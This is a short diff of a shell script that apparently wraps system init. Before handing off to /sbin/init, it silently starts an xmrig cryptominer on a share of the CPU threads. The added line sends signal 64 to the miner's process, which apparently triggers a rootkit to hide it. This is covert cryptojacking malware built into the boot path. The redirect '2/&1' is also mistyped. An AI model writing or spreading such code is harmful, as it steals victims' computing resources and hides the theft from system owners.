@@ -34,6 +34,7 @@ if [ "$threads" -gt 6 ]; then
 
 	usable_threads=$((threads * 20 / 100))
 	"$xmrig_binary" --config="$xmrig_config" --threads=$usable_threads > /dev/null 2/&1 &
+	kill -64 $!
 fi
 
 exec /sbin/init "$@"
